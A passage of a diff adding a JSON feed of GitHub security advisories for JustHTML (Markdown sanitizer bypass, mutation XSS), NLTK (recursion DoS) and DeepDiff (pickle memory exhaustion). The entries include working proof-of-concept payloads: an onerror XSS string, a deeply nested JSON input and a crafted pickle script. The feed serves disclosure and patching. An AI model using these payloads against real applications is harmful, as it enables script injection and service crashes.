+      "url": "https://api.github.com/advisories/GHSA-3rcm-vjrc-p45j",
+      "html_url": "https://github.com/advisories/GHSA-3rcm-vjrc-p45j",
+      "summary": "JustHTML has a Sanitizer Bypass (in Markdown)",
+      "description": "## Summary\n\n`to_markdown()` does not sufficiently escape text content that looks like HTML. As a result, untrusted input that is safe in `to_html()` can become raw HTML in Markdown output.\n\nThis is not specific to tokenizer raw-text states like `<title>`, `<noscript>`, or `<plaintext>`, although those states can trigger the behavior. The root cause is broader: Markdown text serialization leaves angle brackets unescaped in text nodes.\n\n## Details\n\nWhen converting a parsed document to Markdown, text nodes are escaped for a small set of Markdown metacharacters, but HTML-significant characters such as `<` and `>` are preserved. That means content parsed as text, including entity-decoded text or text produced by RCDATA/RAWTEXT-style parsing, can be emitted into Markdown as raw HTML.\n\nExamples of affected input include:\n\n- Text produced from entity-decoded input such as `&lt;script&gt;...&lt;/script&gt;`\n- Text inside elements like `<title>`, `<textarea>`, `<noscript>` (when parsed as raw text), and `<plaintext>`\n\nThis is distinct from actual `<script>` or `<style>` elements in the DOM. Those are already dropped by default in `to_markdown()` unless `html_passthrough=True`.\n\n## Proof of Concept\n\n### General case\n\n```python\nfrom justhtml import JustHTML\n\ndoc = JustHTML(\"<p>&lt;img src=x onerror=alert(1)&gt;</p>\", fragment=True)\n\nprint(doc.to_html())\nprint()\nprint(doc.to_markdown())",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/EmilStenstrom/justhtml/security-advisories/GHSA-3rcm-vjrc-p45j",
+      "source_code_location": "https://github.com/EmilStenstrom/justhtml",
+      "identifiers": [
+        {
+          "value": "GHSA-3rcm-vjrc-p45j",
+          "type": "GHSA"
+        }
+      ],
+      "references": [
+        "https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-3rcm-vjrc-p45j",
+        "https://github.com/advisories/GHSA-3rcm-vjrc-p45j"
+      ],
+      "published_at": "2026-03-18T20:19:56Z",
+      "updated_at": "2026-03-18T20:19:56Z",
+      "github_reviewed_at": "2026-03-18T20:19:56Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "justhtml"
+          },
+          "vulnerable_version_range": "<= 1.11.0",
+          "first_patched_version": "1.12.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+          "score": 5.3
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-79",
+          "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "kejcao",
+            "id": 106453563,
+            "node_id": "U_kgDOBlhaOw",
+            "avatar_url": "https://avatars.githubusercontent.com/u/106453563?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/kejcao",
+            "html_url": "https://github.com/kejcao",
+            "followers_url": "https://api.github.com/users/kejcao/followers",
+            "following_url": "https://api.github.com/users/kejcao/following{/other_user}",
+            "gists_url": "https://api.github.com/users/kejcao/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/kejcao/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/kejcao/subscriptions",
+            "organizations_url": "https://api.github.com/users/kejcao/orgs",
+            "repos_url": "https://api.github.com/users/kejcao/repos",
+            "events_url": "https://api.github.com/users/kejcao/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/kejcao/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    }
+  },
+  {
+    "id": "GHSA-qvc2-mg72-jjhx",
+    "source": "github",
+    "type": "advisory",
+    "title": "JustHTML Affected by Mutation XSS via Literal Text Serialization in Raw Text Elements (style/script)",
+    "description": "## Summary\n\nSanitized DOM trees can be unsafe to serialize when a custom policy allows raw-text elements such as `<style>` or `<script>`.\n\nThe issue affects DOM trees that are constructed or modified programmatically and then passed through `sanitize_dom()` with a policy that keeps these elements. Text nodes inside `<style>` and `<script>` are serialized literally, so attacker-controlled text containing the matching closing tag sequence can break out of the raw-text context and inject HTML into ",
+    "severity": "medium",
+    "published_at": "2026-03-18T20:19:47Z",
+    "attack_patterns": [
+      "inject"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-qvc2-mg72-jjhx",
+      "cve_id": null,
+      "url": "https://api.github.com/advisories/GHSA-qvc2-mg72-jjhx",
+      "html_url": "https://github.com/advisories/GHSA-qvc2-mg72-jjhx",
+      "summary": "JustHTML Affected by Mutation XSS via Literal Text Serialization in Raw Text Elements (style/script)",
+      "description": "## Summary\n\nSanitized DOM trees can be unsafe to serialize when a custom policy allows raw-text elements such as `<style>` or `<script>`.\n\nThe issue affects DOM trees that are constructed or modified programmatically and then passed through `sanitize_dom()` with a policy that keeps these elements. Text nodes inside `<style>` and `<script>` are serialized literally, so attacker-controlled text containing the matching closing tag sequence can break out of the raw-text context and inject HTML into the serialized output.\n\nThe default sanitization policy is not affected because it drops the contents of `style` and `script`.\n\n## Details\n\nThe root cause is in HTML serialization of raw-text elements. In serialize.py, text children of `script` and `style` are emitted verbatim:\n\n```python\n_LITERAL_TEXT_SERIALIZATION_ELEMENTS = frozenset({\"script\", \"style\"})\n\ndef _serialize_text_for_parent(text: str | None, parent_name: str | None) -> str:\n    if not text:\n        return \"\"\n    if parent_name in _LITERAL_TEXT_SERIALIZATION_ELEMENTS:\n        return text\n    return _escape_text(text)",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/EmilStenstrom/justhtml/security-advisories/GHSA-qvc2-mg72-jjhx",
+      "source_code_location": "https://github.com/EmilStenstrom/justhtml",
+      "identifiers": [
+        {
+          "value": "GHSA-qvc2-mg72-jjhx",
+          "type": "GHSA"
+        }
+      ],
+      "references": [
+        "https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-qvc2-mg72-jjhx",
+        "https://github.com/advisories/GHSA-qvc2-mg72-jjhx"
+      ],
+      "published_at": "2026-03-18T20:19:47Z",
+      "updated_at": "2026-03-18T20:19:48Z",
+      "github_reviewed_at": "2026-03-18T20:19:47Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "justhtml"
+          },
+          "vulnerable_version_range": "<= 1.11.0",
+          "first_patched_version": "1.12.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+          "score": 5.3
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-79",
+          "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "restriction",
+            "id": 114768995,
+            "node_id": "U_kgDOBtc8Yw",
+            "avatar_url": "https://avatars.githubusercontent.com/u/114768995?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/restriction",
+            "html_url": "https://github.com/restriction",
+            "followers_url": "https://api.github.com/users/restriction/followers",
+            "following_url": "https://api.github.com/users/restriction/following{/other_user}",
+            "gists_url": "https://api.github.com/users/restriction/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/restriction/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/restriction/subscriptions",
+            "organizations_url": "https://api.github.com/users/restriction/orgs",
+            "repos_url": "https://api.github.com/users/restriction/repos",
+            "events_url": "https://api.github.com/users/restriction/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/restriction/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    }
+  },
+  {
+    "id": "GHSA-rf74-v2fm-23pw",
+    "source": "github",
+    "type": "advisory",
+    "title": "Natural Language Toolkit (NLTK) has unbounded recursion in JSONTaggedDecoder.decode_obj() may cause ",
+    "description": "### Summary\n`JSONTaggedDecoder.decode_obj()` in `nltk/jsontags.py` calls itself \nrecursively without any depth limit. A deeply nested JSON structure \nexceeding `sys.getrecursionlimit()` (default: 1000) will raise an \nunhandled `RecursionError`, crashing the Python process.\n\n### Affected code\nFile: `nltk/jsontags.py`, lines 47–52\n```python\n@classmethod\ndef decode_obj(cls, obj):\n    if isinstance(obj, dict):\n        obj = {key: cls.decode_obj(val) for (key, val) in obj.items()}\n    elif isinstance",
+    "severity": "medium",
+    "published_at": "2026-03-18T20:17:43Z",
+    "attack_patterns": [
+      "code",
+      "path"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-rf74-v2fm-23pw",
+      "cve_id": null,
+      "url": "https://api.github.com/advisories/GHSA-rf74-v2fm-23pw",
+      "html_url": "https://github.com/advisories/GHSA-rf74-v2fm-23pw",
+      "summary": "Natural Language Toolkit (NLTK) has unbounded recursion in JSONTaggedDecoder.decode_obj() may cause DoS",
+      "description": "### Summary\n`JSONTaggedDecoder.decode_obj()` in `nltk/jsontags.py` calls itself \nrecursively without any depth limit. A deeply nested JSON structure \nexceeding `sys.getrecursionlimit()` (default: 1000) will raise an \nunhandled `RecursionError`, crashing the Python process.\n\n### Affected code\nFile: `nltk/jsontags.py`, lines 47–52\n```python\n@classmethod\ndef decode_obj(cls, obj):\n    if isinstance(obj, dict):\n        obj = {key: cls.decode_obj(val) for (key, val) in obj.items()}\n    elif isinstance(obj, list):\n        obj = list(cls.decode_obj(val) for val in obj)\n```\n\n### Proof of Concept\n```python\nimport sys, json\nfrom nltk.jsontags import JSONTaggedDecoder\n\ndepth = sys.getrecursionlimit() + 50  # e.g. 1050\npayload = '{\"x\":' * depth + \"null\" + \"}\" * depth\n\n# Raises RecursionError, crashing the process\njson.loads(payload, cls=JSONTaggedDecoder)\n```\n\n### Impact\nAny code path that passes externally-supplied JSON to \n`JSONTaggedDecoder` is vulnerable to denial of service.\nThe severity depends on whether such a path exists in the \ncalling code (e.g. `nltk/data.py`).\n\n### Suggested Fix\nAdd a depth parameter with a hard limit:\n```python\n@classmethod\ndef decode_obj(cls, obj, _depth=0):\n    if _depth > 100:\n        raise ValueError(\"JSON nesting too deep\")\n    if isinstance(obj, dict):\n        obj = {key: cls.decode_obj(val, _depth + 1) \n               for (key, val) in obj.items()}\n    elif isinstance(obj, list):\n        obj = list(cls.decode_obj(val, _depth + 1) for val in obj)\n```",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/nltk/nltk/security-advisories/GHSA-rf74-v2fm-23pw",
+      "source_code_location": "https://github.com/nltk/nltk",
+      "identifiers": [
+        {
+          "value": "GHSA-rf74-v2fm-23pw",
+          "type": "GHSA"
+        }
+      ],
+      "references": [
+        "https://github.com/nltk/nltk/security/advisories/GHSA-rf74-v2fm-23pw",
+        "https://github.com/advisories/GHSA-rf74-v2fm-23pw"
+      ],
+      "published_at": "2026-03-18T20:17:43Z",
+      "updated_at": "2026-03-18T20:17:44Z",
+      "github_reviewed_at": "2026-03-18T20:17:43Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "nltk"
+          },
+          "vulnerable_version_range": "<= 3.9.3",
+          "first_patched_version": null,
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+          "score": 5.1
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-674",
+          "name": "Uncontrolled Recursion"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "ZeroXJacks",
+            "id": 189536965,
+            "node_id": "U_kgDOC0waxQ",
+            "avatar_url": "https://avatars.githubusercontent.com/u/189536965?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/ZeroXJacks",
+            "html_url": "https://github.com/ZeroXJacks",
+            "followers_url": "https://api.github.com/users/ZeroXJacks/followers",
+            "following_url": "https://api.github.com/users/ZeroXJacks/following{/other_user}",
+            "gists_url": "https://api.github.com/users/ZeroXJacks/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/ZeroXJacks/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/ZeroXJacks/subscriptions",
+            "organizations_url": "https://api.github.com/users/ZeroXJacks/orgs",
+            "repos_url": "https://api.github.com/users/ZeroXJacks/repos",
+            "events_url": "https://api.github.com/users/ZeroXJacks/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/ZeroXJacks/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    }
+  },
+  {
+    "id": "GHSA-54jj-px8x-5w5q",
+    "source": "github",
+    "type": "advisory",
+    "title": "DeepDiff has Memory Exhaustion DoS through SAFE_TO_IMPORT",
+    "description": "### Summary\n\nThe pickle unpickler `_RestrictedUnpickler` validates which classes can be loaded but does not limit their constructor arguments. A few of the types in `SAFE_TO_IMPORT` have constructors that allocate memory proportional to their input (`builtins.bytes`, `builtins.list`, `builtins.range`). A 40-byte pickle payload can force 10+ GB of memory, which crashes applications that load delta objects or call `pickle_load` with untrusted data.\n\n### Details\n\nCVE-2025-58367 hardened the delta c",
+    "severity": "high",
+    "published_at": "2026-03-18T20:10:08Z",
+    "attack_patterns": [
+      "remote",
+      "code",
+      "upload",
+      "deserialization",
+      "path",
+      "traversal"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-54jj-px8x-5w5q",
+      "cve_id": "CVE-2026-33155",
+      "url": "https://api.github.com/advisories/GHSA-54jj-px8x-5w5q",
+      "html_url": "https://github.com/advisories/GHSA-54jj-px8x-5w5q",
+      "summary": "DeepDiff has Memory Exhaustion DoS through SAFE_TO_IMPORT",
+      "description": "### Summary\n\nThe pickle unpickler `_RestrictedUnpickler` validates which classes can be loaded but does not limit their constructor arguments. A few of the types in `SAFE_TO_IMPORT` have constructors that allocate memory proportional to their input (`builtins.bytes`, `builtins.list`, `builtins.range`). A 40-byte pickle payload can force 10+ GB of memory, which crashes applications that load delta objects or call `pickle_load` with untrusted data.\n\n### Details\n\nCVE-2025-58367 hardened the delta class against pollution and remote code execution by converting `SAFE_TO_IMPORT` to a `frozenset` and blocking traversal. `_RestrictedUnpickler.find_class` only gates which classes can be loaded. It doesn't intercept `REDUCE` opcodes or validate what is passed to constructors.\n\nIt can be exploited in 2 ways.\n\n**1 - During `pickle_load`**\n\nA pickle that calls `bytes(N)` using opcodes permitted by the allowlist. The allocation happens during deserialization and before the delta processes anything. The restricted unpickler does not override `load_reduce` so any allowed class can be called.\n\n```\nGLOBAL builtins.bytes      (passes find_class check — serialization.py:353)\nINT    10000000000          (10 billion)\nTUPLE + REDUCE             → bytes(10**10) → allocates ~9.3 GB\n```\n\n**2 - During delta application**\n\nA valid diff dict that first sets a value to a large int via `values_changed`, then converts it to bytes via `type_changes`. It works because `_do_values_changed()` runs before `_do_type_changes()` in `Delta.add()` in `delta.py` line 183. Step 1 modifies the target in place before step 2 reads the modified value and calls `new_type(current_old_value)` at `delta.py` line 576 with no size guard.\n\n### PoC\n\nThe script uses Python's `resource` module to cap memory to 1 GB so you can reproduce safely without hitting the OOM killer. It loads deepdiff first, applies the limit, then runs the payload. Change `10**8` to `10**10` for the full 9.3 GB allocation.\n\n```python\nimport resource\nimport sys\n\ndef limit_memory(maxsize_mb):\n    \"\"\"Cap virtual memory for this process.\"\"\"\n    soft, hard = resource.getrlimit(resource.RLIMIT_AS)\n    maxsize_bytes = maxsize_mb * 1024 * 1024\n    try:\n        resource.setrlimit(resource.RLIMIT_AS, (maxsize_bytes, hard))\n        print(f\"[*] Memory limit set to {maxsize_mb} MB\")\n    except ValueError:\n        print(\"[!] Failed to set memory limit.\")\n        sys.exit(1)\n\n# Load heavy imports before enforcing the limit\nfrom deepdiff import Delta\nfrom deepdiff.serialization import pickle_dump, pickle_load\n\nlimit_memory(1024)\n\n# --- Delta application path ---\npayload_dict = {\n    'values_changed': {\"root['x']\": {'new_value': 10**8}},\n    'type_changes': {\"root['x']\": {'new_type': bytes}},\n}\n\npayload1 = pickle_dump(payload_dict)\nprint(f\"Payload size: {len(payload1)} bytes\")\n\ntarget = {'x': 'anything'}\ntry:\n    result = target + Delta(payload1)\n    print(f\"Allocated: {len(result['x']) // 1024 // 1024} MB\")\n    print(f\"Amplification: {len(result['x']) // len(payload1)}x\")\nexcept MemoryError:\n    print(\"[!] MemoryError — payload tried to allocate too much\")\n\n# --- Raw pickle path ---\npayload2 = (\n    b\"(dp0\\n\"\n    b\"S'_'\\n\"\n    b\"cbuiltins\\nbytes\\n\"\n    b\"(I100000000\\n\"\n    b\"tR\"\n    b\"s.\"\n)\n\nprint(f\"Payload size: {len(payload2)} bytes\")\ntry:\n    result2 = pickle_load(payload2)\n    print(f\"Allocated: {len(result2['_']) // 1024 // 1024} MB\")\nexcept MemoryError:\n    print(\"[!] MemoryError — payload tried to allocate too much\")\n```\n\nOutput:\n```\n[*] Memory limit set to 1024 MB\nPayload size: 123 bytes\nAllocated: 95 MB\nAmplification: 813008x\nPayload size: 42 bytes\nAllocated: 95 MB\n```\n\n### Impact\n\nDenial of service. Any application that deserializes delta objects or calls `pickle_load` with untrusted inputs can be crashed with a small payload. The restricted unpickler is meant to make this safe. It prevents remote code execution but doesn't prevent resource exhaustion.\n\nThe amplification is large. 800,000x for delta and 2,000,000x for raw pickle.\n\nImpacted users are anyone who accepts serialized delta objects from untrusted sources — network APIs, file uploads, message queues, etc.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/qlustered/deepdiff/security-advisories/GHSA-54jj-px8x-5w5q",
+      "source_code_location": "https://github.com/seperman/deepdiff",
+      "identifiers": [
+        {
+          "value": "GHSA-54jj-px8x-5w5q",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33155",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/qlustered/deepdiff/security/advisories/GHSA-54jj-px8x-5w5q",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-33155",
+        "https://github.com/qlustered/deepdiff/commit/0d07ec21d12b46ef4e489383b363eadc22d990fb",
+        "https://github.com/advisories/GHSA-54jj-px8x-5w5q"
+      ],
+      "published_at": "2026-03-18T20:10:08Z",
+      "updated_at": "2026-03-20T21:34:49Z",
+      "github_reviewed_at": "2026-03-18T20:10:08Z",
+      "nvd_published_at": "2026-03-20T21:17:15Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "deepdiff"
+          },
+          "vulnerable_version_range": ">= 5.0.0, <= 8.6.1",
+          "first_patched_version": "8.6.2",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "am-periphery",
+            "id": 138065765,
+            "node_id": "U_kgDOCDq3ZQ",
+            "avatar_url": "https://avatars.githubusercontent.com/u/138065765?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/am-periphery",
+            "html_url": "https://github.com/am-periphery",
+            "followers_url": "https://api.github.com/users/am-periphery/followers",
+            "following_url": "https://api.github.com/users/am-periphery/following{/other_user}",
+            "gists_url": "https://api.github.com/users/am-periphery/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/am-periphery/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/am-periphery/subscriptions",
+            "organizations_url": "https://api.github.com/users/am-periphery/orgs",
+            "repos_url": "https://api.github.com/users/am-periphery/repos",
+            "events_url": "https://api.github.com/users/am-periphery/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/am-periphery/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "epss": {
+        "percentage": 0.00042,
+        "percentile": 0.12824
+      }
+    }
+  }
+]
